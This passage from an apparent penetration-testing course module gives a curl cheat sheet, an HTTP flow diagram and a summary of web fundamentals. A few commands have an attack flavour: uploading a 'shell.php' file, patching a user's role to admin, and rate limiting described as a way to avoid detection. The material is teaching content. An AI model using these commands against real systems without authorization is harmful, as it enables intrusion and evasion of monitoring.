```bash
# -----------------------------------------------
# BASIC REQUESTS
# -----------------------------------------------

# Simple GET request
curl https://example.com
# -s: silent (no progress bar)
# -i: include response headers
# -v: verbose (show full request + response)
curl -s -i -v https://example.com

# GET with custom header
curl -H "Authorization: Bearer eyJhbG..." \
     -H "Accept: application/json" \
     https://api.example.com/users

# -----------------------------------------------
# POST REQUESTS
# -----------------------------------------------

# POST form data (application/x-www-form-urlencoded)
curl -X POST \
     -d "username=admin&password=secret" \
     https://example.com/login

# POST JSON body (application/json)
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"secret"}' \
     https://api.example.com/auth

# POST with file upload (multipart/form-data)
curl -X POST \
     -F "file=@/path/to/shell.php" \
     -F "submit=Upload" \
     https://example.com/upload

# -----------------------------------------------
# OTHER HTTP METHODS
# -----------------------------------------------

# PUT (replace resource)
curl -X PUT \
     -H "Content-Type: application/json" \
     -d '{"email":"new@example.com"}' \
     https://api.example.com/users/42

# PATCH (partial update)
curl -X PATCH \
     -H "Content-Type: application/json" \
     -d '{"role":"admin"}' \
     https://api.example.com/users/42

# DELETE
curl -X DELETE https://api.example.com/users/42

# OPTIONS (discover allowed methods)
curl -X OPTIONS -i https://api.example.com/users

# HEAD (get headers without body)
curl -I https://example.com

# TRACE (echo request back -- usually disabled)
curl -X TRACE https://example.com

# -----------------------------------------------
# COOKIES AND SESSIONS
# -----------------------------------------------

# Send a cookie
curl -b "session_id=abc123; theme=dark" https://example.com

# Save cookies to file (cookie jar)
curl -c cookies.txt https://example.com/login \
     -d "user=admin&pass=secret"

# Load cookies from file
curl -b cookies.txt https://example.com/dashboard

# -----------------------------------------------
# TLS / CERTIFICATE INSPECTION
# -----------------------------------------------

# Skip TLS verification (useful for self-signed certs in labs)
curl -k https://192.168.1.100

# Show TLS certificate info
curl -v --head https://example.com 2>&1 | grep -E "subject|issuer|SSL"

# Specify TLS version
curl --tls-max 1.2 https://example.com

# -----------------------------------------------
# PROXY (THROUGH BURP SUITE)
# -----------------------------------------------

# Route traffic through Burp Suite (listening on 127.0.0.1:8080)
curl -x http://127.0.0.1:8080 -k https://example.com

# -----------------------------------------------
# FOLLOWING REDIRECTS AND OUTPUT
# -----------------------------------------------

# Follow redirects
curl -L https://example.com

# Save output to file
curl -o output.html https://example.com

# Rate limit (useful to avoid detection)
curl --limit-rate 100k https://example.com

# Set User-Agent string
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://example.com
```

### HTTP Request/Response Flow — Mermaid

```mermaid
flowchart LR
    A["User types URL in browser"] --> B["DNS Lookup: Domain to IP"]
    B --> C["TCP Handshake: SYN / SYN-ACK / ACK"]
    C --> D{HTTPS?}
    D -->|Yes| E["TLS Handshake: Certificate verification, Key exchange"]
    D -->|No| F["HTTP Request sent"]
    E --> F
    F --> G["Server processes request"]
    G --> H{Static or Dynamic?}
    H -->|Static| I["Read file from disk: HTML, CSS, JS"]
    H -->|Dynamic| J["Execute code, Query database, Apply business logic"]
    I --> K["HTTP Response: 200 OK + body"]
    J --> K
    K --> L["Browser renders HTML, Fetches sub-resources: CSS, JS, images"]
    L --> M["Page displayed to user"]
```

---

## 16. Summary

You now understand the complete lifecycle of a web request:

| Concept | Key Takeaway |
|---------|-------------|
| **Client-Server** | Browser requests, server responds over HTTP |
| **HTTP anatomy** | Every request/response has method, headers, and body |
| **Status codes** | 2xx=success, 3xx=redirect, 4xx=client error, 5xx=server error |
| **DNS** | Translates domain names to IP addresses through a hierarchy |
| **TLS** | Encrypts HTTP traffic via certificate-based key exchange |
| **Cookies** | State management — HttpOnly and Secure flags are critical |
| **Sessions vs JWT** | Stateful vs stateless — each has distinct security properties |
| **SOP** | Browsers block cross-origin reads to protect users |
| **CORS** | Controlled relaxation of SOP with server headers |
| **Security headers** | CSP, HSTS, X-Frame-Options — server-side browser instructions |

---

## 17. Next Steps

With a solid understanding of HTTP and web fundamentals, advance to:

- **Web Security Foundations**: [Module_21_Web_Security_Foundations.md](../Volume_05_Web_Security_Foundations/Module_21_Web_Security_Foundations.md) — hands-on web application security techniques
- **OWASP Top 10 Deep Dive**: [Module_30_OWASP_Top_10_Deep_Dive.md](../Volume_06_Web_Application_VAPT/Module_30_OWASP_Top_10_Deep_Dive.md) — the most critical web vulnerabilities with exploitation techniques
